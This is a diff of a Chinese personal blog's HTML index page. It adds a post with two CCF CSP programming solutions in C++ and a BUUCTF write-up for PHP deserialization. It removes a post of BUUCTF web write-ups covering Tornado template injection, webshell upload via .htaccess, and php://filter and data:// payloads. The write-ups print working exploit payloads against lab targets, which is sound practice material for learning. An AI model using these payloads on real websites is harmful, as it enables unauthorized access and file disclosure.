@@ -73,6 +73,101 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-20240131" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/01/31/20240131/" class="article-date">
+  <time class="dt-published" datetime="2024-01-31T10:49:35.000Z" itemprop="datePublished">2024-01-31</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2024/01/31/20240131/">20240131</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h4 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h4><h5 id="202312-1-仓库规划"><a href="#202312-1-仓库规划" class="headerlink" title="202312-1 仓库规划"></a>202312-1 仓库规划</h5><p>题目链接：<a target="_blank" rel="noopener" href="http://118.190.20.162/view.page?gpid=T180">http://118.190.20.162/view.page?gpid=T180</a></p>
+<p>用三层循环逐个比较</p>
+<p>代码：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> M 12</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N 1005</span></span><br><span class="line"><span class="type">int</span> a[N][M];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> n,m;</span><br><span class="line">	cin&gt;&gt;n&gt;&gt;m;</span><br><span class="line">	<span class="type">int</span> i,j,k;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;m;j++)</span><br><span class="line">		&#123;</span><br><span class="line">			cin&gt;&gt;a[i][j];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="type">bool</span> p=<span class="literal">true</span>; <span class="comment">//判断有无上级仓库 </span></span><br><span class="line">		<span class="keyword">for</span>(j=<span class="number">1</span>;j&lt;=n;j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="type">bool</span> pd=<span class="literal">true</span>;</span><br><span class="line">			<span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;m;k++)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span>(a[i][k]&gt;=a[j][k]) </span><br><span class="line">				&#123;</span><br><span class="line">					pd=<span class="literal">false</span>;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span>(pd) <span class="comment">//说明是上级仓库</span></span><br><span class="line">			&#123;</span><br><span class="line">				cout&lt;&lt;j&lt;&lt;endl;</span><br><span class="line">				p=<span class="literal">false</span>;</span><br><span class="line">				<span class="keyword">break</span>; <span class="comment">//只要上级最小的 </span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(p)</span><br><span class="line">		&#123;</span><br><span class="line">			cout&lt;&lt;<span class="number">0</span>&lt;&lt;endl;</span><br><span class="line">		&#125; </span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="202312-2-因子化简"><a href="#202312-2-因子化简" class="headerlink" title="202312-2 因子化简"></a>202312-2 因子化简</h5><p>题目链接：<a target="_blank" rel="noopener" href="http://118.190.20.162/view.page?gpid=T179">http://118.190.20.162/view.page?gpid=T179</a></p>
+<p>对于待分解的数x，从小到大遍历所有可能的因数，可以被x整除就一直除以这个因数，直到x被分解完毕</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_74172965/article/details/135090693?spm=1001.2101.3001.6650.4&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-4-135090693-blog-135080223.235%5Ev43%5Epc_blog_bottom_relevance_base6&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-4-135090693-blog-135080223.235%5Ev43%5Epc_blog_bottom_relevance_base6&utm_relevant_index=9">CCF-CSP真题202312-2因子化简(C++满分题解)_202312-2 试题名称: 因子化简-CSDN博客</a></p>
+<p>代码：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> LL;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> q;</span><br><span class="line">    cin&gt;&gt;q;</span><br><span class="line">    LL res;</span><br><span class="line">    LL n;</span><br><span class="line">    <span class="type">int</span> k;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;q;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        res=<span class="number">1</span>;</span><br><span class="line">        n=<span class="number">0</span>;</span><br><span class="line">        k=<span class="number">0</span>;</span><br><span class="line">        cin&gt;&gt;n;</span><br><span class="line">        cin&gt;&gt;k;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">2</span>;i&lt;=n/i;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> coef=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span>(n%i==<span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                n/=i;</span><br><span class="line">                coef++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//某项指数大于等于制定阈值k，此项才会保留，否则不计入结果</span></span><br><span class="line">            <span class="keyword">if</span>(coef&gt;=k) res*=<span class="built_in">pow</span>(i,coef);</span><br><span class="line">        &#125;</span><br><span class="line">        cout&lt;&lt;res&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="Buuctf"><a href="#Buuctf" class="headerlink" title="Buuctf"></a>Buuctf</h4><h4 id="16-PHP"><a href="#16-PHP" class="headerlink" title="16 PHP"></a>16 PHP</h4><p>题目提示了备份网站</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/18c18833-30dc-498d-acf7-4095c042798c" alt="image"></p>
+<p>使用目录扫描工具 dirsearch</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wuhongbin/p/14048052.html">目录扫描工具 dirsearch 使用详解 - FreeK0x00 - 博客园 (cnblogs.com)</a></p>
+<p>可以直接到github上下载压缩包，解压后，进入目录运行cmd</p>
+<p>首先安装dirsearch：<code>python setup.py install</code></p>
+<p>如果报错，可能是因为pip版本太低，更新pip：<code>python -m pip install --upgrade pip</code></p>
+<p>运行，开始扫描：<code>py -3.9 dirsearch.py -u http://15349308-86d1-4f57-8e2c-50b34e5d48eb.node4.buuoj.cn:81/ -e php</code></p>
+<p>响应成功的如下图所示</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/523abcab-1ce7-4f1a-95e0-6c457c786dd0" alt="image"></p>
+<p>访问<a target="_blank" rel="noopener" href="http://www.zip文件,下载了一个压缩包/">www.zip文件，下载了一个压缩包</a></p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/c166170d-069f-4d99-acb4-e75a2c6ac3fc" alt="image"></p>
+<p>（常见的黑客备份文件有<a target="_blank" rel="noopener" href="http://www.tar.gz和www.zip,尝试www.zip可直接得到文件)/">www.tar.gz和www.zip，尝试www.zip可直接得到文件）</a></p>
+<p>解压得到一系列文件</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/9be93ca0-b413-4787-8b29-3115eec2be45" alt="image"></p>
+<p>查看index.php文件，发现包含class.php文件，采用get传参select，还有个php反序列化函数unserialize()，所以这道题应该是PHP反序列化的题目。</p>
+<p>所以页面可以传进一个参数<code>select</code>然后把它反序列化，反序列化的过程中会用到class.php</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/917331c7-3a19-4c6a-b5b8-2d08ca263360" alt="image"></p>
+<p>查看class.php文件，有输出flag的条件</p>
+<p>要调用到__destruct（）并且<code>password=100,username=admin</code>才能<code>echo $flag</code></p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/ae9dc2e9-205f-41ab-916a-2d1f257c26ed" alt="image"></p>
+<p>魔术方法，反序列化知识点可参考<a target="_blank" rel="noopener" href="https://dbqyw.github.io/2024/01/24/PHP/">https://dbqyw.github.io/2024/01/24/PHP/</a></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">在反序列化脚本结束时会自动调用它，它是unserialize()结束的魔术方法（魔法函数）</span><br><span class="line"></span><br><span class="line">魔术方法</span><br><span class="line">通常来说有一些PHP的魔法函数会导致反序列化漏洞，如：</span><br><span class="line">__construct 当一个对象创建时自动调用</span><br><span class="line">__destruct 当对象被销毁时自动调用 (php绝大多数情况下会自动调用销毁对象)</span><br><span class="line">__sleep() 使**用serialize()函数时触发</span><br><span class="line">__wakeup 使用unserialse()**函数时会自动调用</span><br><span class="line">__toString 当一个对象被当作一个字符串被调用。</span><br><span class="line">__call() 在对象上下文中调用不可访问的方法时触发</span><br><span class="line">__callStatic() 在静态上下文中调用不可访问的方法时触发</span><br><span class="line">__get() 用于从不可访问的属性读取数据//调用私有属性时使用</span><br><span class="line">__set() 用于将数据写入不可访问的属性</span><br><span class="line">__isset() 在不可访问的属性上调用isset()或empty()触发</span><br><span class="line">__unset() 在不可访问的属性上使用unset()时触发</span><br><span class="line">__toString() 把类当作字符串使用时触发,返回值需要为字符串</span><br><span class="line">__invoke() 当脚本尝试将对象调用为函数时触发</span><br></pre></td></tr></table></figure>
+
+<p>构造序列化，php代码：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Name</span><br><span class="line">&#123;</span><br><span class="line">    private $username = &quot;yesyesyes&quot;;</span><br><span class="line">    private $password = &quot;nonono&quot;;</span><br><span class="line">    public function __construct($username,$password)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;username=$username;</span><br><span class="line">        $this-&gt;password=$password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new Name(@admin,100);</span><br><span class="line">//var_dump($a);</span><br><span class="line">//echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">$b = serialize($a);</span><br><span class="line">echo $b.&quot;&lt;br&gt;&quot;;//输出序列化</span><br><span class="line">echo urlencode($b);//输出url编码后的序列化</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>序列化后是这样的：</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/92a4085c-3183-425c-90bf-5175c5f4b940" alt="image"></p>
+<p>调用unserialize()时会自动调用魔法函数wakeup(),可以通过改变属性数绕过，把Name后面的2改为3或以上即可</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Name&quot;:3:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后url识别不了”，改为%22</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:%22Name%22:3:&#123;s:14:%22Nameusername%22;s:5:%22admin%22;s:14:%22Namepassword%22;i:100;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>因为成员（属性）是private，所以要在类名和成员名前加%00这个url编码是空的意思。因为生产序列化时不会把这个空也输出。</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:%22Name%22:3:&#123;s:14:%22%00Name%00username%22;s:5:%22admin%22;s:14:%22%00Name%00password%22;i:100;&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>完整payload：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?select=O:4:%22Name%22:3:&#123;s:14:%22%00Name%00username%22;s:5:%22admin%22;s:14:%22%00Name%00password%22;i:100;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/ed749694-f9ae-4d63-a042-26d448f40f32" alt="image"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/01/31/20240131/" data-id="cls1fqbrd000058vfblbc7b66" data-title="20240131" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/learn/" rel="tag">learn</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-Web-Basic" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2024/01/31/Web-Basic/" class="article-date">
@@ -1053,142 +1148,6 @@
 
 
   
-    <article id="post-Buuctf Web（21-24）" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2023/08/11/Buuctf%20Web%EF%BC%8821-24%EF%BC%89/" class="article-date">
-  <time class="dt-published" datetime="2023-08-11T11:44:06.000Z" itemprop="datePublished">2023-08-11</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2023/08/11/Buuctf%20Web%EF%BC%8821-24%EF%BC%89/">Buuctf Web（21-24）</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h3 id="Buuctf-Web（21-24）"><a href="#Buuctf-Web（21-24）" class="headerlink" title="Buuctf Web（21-24）"></a>Buuctf Web（21-24）</h3><h4 id="21、easy-tornado"><a href="#21、easy-tornado" class="headerlink" title="21、easy_tornado"></a>21、easy_tornado</h4><p>题目首页有三个链接，首先查看&#x2F;flag.txt，可以看到flag在&#x2F;fllllllllllllag中</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/8124ed8c-6dfb-4f89-b050-8a841a4e56b2" alt="image"></p>
-<p>查看&#x2F;fllllllllllllag，显示Error</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/9a24200a-c33a-4ec5-b86a-0f598b975988" alt="image"></p>
-<p>并且url变成了&#x2F;error?msg&#x3D;Error</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/bb555e51-15cf-4a34-ab56-50f0446c84f2" alt="image"></p>
-<p>查看&#x2F;welcome.txt，内容为render</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/1b813424-aff6-4218-b808-4b0d4b8d3426" alt="image"></p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页 ，如果用户对render内容可控，不仅可以注入XSS代码，而且还可以通过&#123;&#123;&#125;&#125;进行传递变量和执行简单的表达式。</span><br><span class="line">Tornado是一种 Web 服务器软件的开源版本。Tornado 和现在的主流 Web 服务器框架（包括大多数 Python 的框架）有着明显的区别：它是非阻塞式服务器，而且速度相当快。</span><br></pre></td></tr></table></figure>
-
-<p>查看&#x2F;hints.txt，这是一个加密方法，猜测 要构造<code>filename=/fllllllllllllag&amp;filehash=？</code></p>
-<p><img src="C:\Users\15646\AppData\Roaming\Typora\typora-user-images\image-20230812150637958.png" alt="image-20230812150637958"></p>
-<p>在查阅资料后发现Error就是注入点</p>
-<p>本题是模板注入<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/aef2ae0498df">SSTI模板注入 - 简书 (jianshu.com)</a></p>
-<p>参考资料<a target="_blank" rel="noopener" href="https://www.cnblogs.com/bwangel23/p/4858870.html">Tornado小记 – 模板中的Handler - 黑翼天使23 - 博客园 (cnblogs.com)</a></p>
-<p>获取handler.settings环境变量：<code>/error?msg=&#123;&#123;handler.settings&#125;&#125;</code></p>
-<p>得到cookie_secret</p>
-<p><code>&#39;cookie_secret&#39;: &#39;caffff81-323f-48da-8323-dc1530a0c95d&#39;</code></p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/32f7ab16-b8c5-4a51-acb3-1c4202250294" alt="image"></p>
-<p>编写脚本</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">def Md5(x):</span><br><span class="line">    md5 = hashlib.md5(str(x).encode(&quot;utf8&quot;)).hexdigest()</span><br><span class="line">    return md5</span><br><span class="line">    </span><br><span class="line">print(Md5(&quot;caffff81-323f-48da-8323-dc1530a0c95d&quot;+Md5(&quot;/fllllllllllllag&quot;)))</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/a033cbb8-a253-4db8-bf82-8ddf811a549c" alt="image"></p>
-<p>构造<code>/file?filename=/fllllllllllllag&amp;filehash=7d14388e78d85a8f1e726052e9d4dfbd</code></p>
-<p>得到flag</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/2f83150e-3dd7-4d3a-89b2-1b63b92c9691" alt="image"></p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;5673c2e4-27f7-4962-8d87-f449b8069952&#125;</span><br></pre></td></tr></table></figure>
-
-<h4 id="22、admin"><a href="#22、admin" class="headerlink" title="22、admin"></a>22、admin</h4><p>注册一个账号</p>
-<p>由于题目叫admin，所以注册时直接用admin了</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/d1074fae-9dc5-476a-a188-aac12ef08226" alt="image"></p>
-<p>显示用户名已经被注册过</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/b73df34a-1a5b-4f00-b869-c72281dd2abb" alt="image"></p>
-<p>注册一个账号</p>
-<p>由于题目叫admin，所以注册时直接用admin了</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/d1074fae-9dc5-476a-a188-aac12ef08226" alt="image"></p>
-<p>显示用户名已经被注册过</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/b73df34a-1a5b-4f00-b869-c72281dd2abb" alt="image"></p>
-<p>猜密码</p>
-<p>用123登陆成功了。。。</p>
-<p><img src="C:\Users\15646\AppData\Roaming\Typora\typora-user-images\image-20230812171109196.png" alt="image-20230812171109196"></p>
-<p>在网上看大佬解题思路</p>
-<p>注册</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/0dc1b0d0-bc52-4352-a081-27b2a6b5f2f7" alt="image"></p>
-<p>登录，右侧依次查看</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/d87e4454-5a16-4fea-9512-9bef90f01a9c" alt="image"></p>
-<p>在change password的源代码中看到一个被注释的链接</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/bc16f3dc-36de-4130-885a-8334541c24ee" alt="image"></p>
-<p>访问这个链接，内容已被删除，所以就没再看了</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/b1fe4d77-4ed1-4c7b-a261-dbf716519595" alt="image"></p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;88c07276-46ea-4e23-a50d-ce722b067e0f&#125;</span><br></pre></td></tr></table></figure>
-
-<h4 id="23、你传你🐎呢"><a href="#23、你传你🐎呢" class="headerlink" title="23、你传你🐎呢"></a>23、你传你🐎呢</h4><p>查看大佬的博客后，了解到，该题需要上传两个文件</p>
-<p>一、<code>.htaccess</code>文件，用来改变文件扩展名</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/546f346f-4cc2-4387-99b5-e4f679a198c6" alt="image"></p>
-<p>上传该文件，抓包，修改Content-Type:image&#x2F;png，send</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/eb0d84c7-11ba-4569-86ce-2d852e01f523" alt="image"></p>
-<p>二、木马文件，用来连接蚁剑</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/e02853bf-cf0e-4480-a249-a94d1e290c97" alt="image"></p>
-<p>改名为a.png，上传，抓包，修改Content-Type:image&#x2F;png，send</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/8647b067-6164-4385-a7a1-3d27b8eb1697" alt="image"></p>
-<p>用蚁剑连接</p>
-<p>URL：<code>http://f532922c-3101-4cac-ad67-3e8b27c936fe.node4.buuoj.cn:81/upload/535c8c0c4ab4ecda962a1a3922bee31d/a.png</code></p>
-<p>密码：<code>a</code></p>
-<p>没测试成功，试了很久没写出来，留着以后看</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h4 id="24、NiZhuanSiWei"><a href="#24、NiZhuanSiWei" class="headerlink" title="24、NiZhuanSiWei"></a>24、NiZhuanSiWei</h4><p>从题目的php代码中可以知道需要用get方式传三个参数，text，file，password</p>
-<p>有一个php文件</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/2ed62ae4-cebd-49e4-9fff-62144ce580d8" alt="image"></p>
-<p>访问该文件，什么都没有</p>
-<p>有一行代码说我们要传入一个文件，内容是”welcome to the zjctf”</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/7acb96ce-aecd-4d57-813d-096ae3ddf798" alt="image"></p>
-<p>要用到data协议，data协议通常是用来执行PHP代码，也可以将内容写入data协议中，然后让file_get_contents函数取读取。构造：<code>data://text/plain,welcome to the zjctf</code></p>
-<p>为了绕过一些过滤，用base64编码构造payload：<code>/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</code></p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/22b156d1-ff92-4112-a963-03edd63872d5" alt="image"></p>
-<p>有一个可控参数file，构造file&#x3D;useless.php，但是针对php文件我们需要进行base64编码，否则读取不到其内容，所以构造payload：<code>/?file=php://filter/read=convert.base64-encode/resource=useless.php</code></p>
-<p>完整payload：<code>/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</code></p>
-<p>得到一串base64编码</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/bd421ff2-86f8-48fc-8536-ba0c204a473a" alt="image"></p>
-<p>解码</p>
-<p>得到useless.php源码</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/ff8cc374-6ccb-426b-8372-707bdb01642a" alt="image"></p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php  </span><br><span class="line"></span><br><span class="line">class Flag&#123;  //flag.php  </span><br><span class="line">    public $file;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">?&gt;  </span><br></pre></td></tr></table></figure>
-
-<p>有一个 flag.php ,并且file不为空将读取flag.php并显示。所以。构造一个序列化字符串</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php  </span><br><span class="line"></span><br><span class="line">class Flag&#123;  //flag.php  </span><br><span class="line">    public $file=flag.php;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">$a = new Flag();</span><br><span class="line">$a-&gt;file=&quot;flag.php&quot;;</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure>
-
-<p>找个在<a target="_blank" rel="noopener" href="https://c.runoob.com/compile/1">线运行PHP</a>的网站，得到</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/750e7fdf-d5d6-4c19-a5eb-19b42d5f7b33" alt="image"></p>
-<p>构造payload：<code>/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code></p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/9ebb7fdd-ca59-4728-bf1d-30e878e931e2" alt="image"></p>
-<p>查看源代码，得到flag</p>
